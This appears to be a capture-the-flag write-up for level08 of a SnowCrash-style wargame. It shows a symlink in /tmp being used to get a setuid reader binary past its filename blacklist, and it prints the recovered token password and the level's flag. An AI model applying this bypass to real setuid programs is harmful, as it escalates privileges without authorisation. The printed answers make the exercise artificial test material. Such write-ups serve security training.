## level08

1. Check files in current working directory (home dir)
    - `-rwsr-s---+ 1 flag08  level08 8617 Mar  5  2016 level08*`
    - `-rw-------  1 flag08  flag08    26 Mar  5  2016 token`

We can't read the `token` file, only `flag08` can.

Executing the binary `level08` gives us this :

```bash
$ ./level08
./level08 [file to read]
```

This seems a bit easy, let's try to read the `token` file :

```bash
$ ./level08 token
You may not access 'token'
```

Trying to read a file in `/tmp/` works. Trying to read a file in `/home/user/level08` for which the user `flag08` has no permissions doesn't work either, but in these cases, the binary tells us it doesn't have the permissions to read the file.

So is the file `token` blacklisted? If we try to read the file `tokena` or `tokenaa` or even `tokenAAAAAAAAAAAAAAAAAAAAAAAaaaAAAAAAAaaaAAAA` it tells us that we are unable to access it.

But, reading the file `tokeN` works. So the binary is case sensitive, and the string `token` is blacklisted. In fact, any string containing `token` is blacklisted.

On unix system there's a way of reading file but not using their real name, using symlinks.

```
level08@SnowCrash:~$ ln -s /home/user/level08/token /tmp/tok
level08@SnowCrash:~$ cat /tmp/tok
cat: /tmp/tok: Permission denied
level08@SnowCrash:~$ ./level08 /tmp/tok
quif5eloekouj29ke0vouxean
```
use `quif5eloekouj29ke0vouxean` to  login to flag08 user

flag -> 25749xKZ8L7DkSCwJkT9dyv6f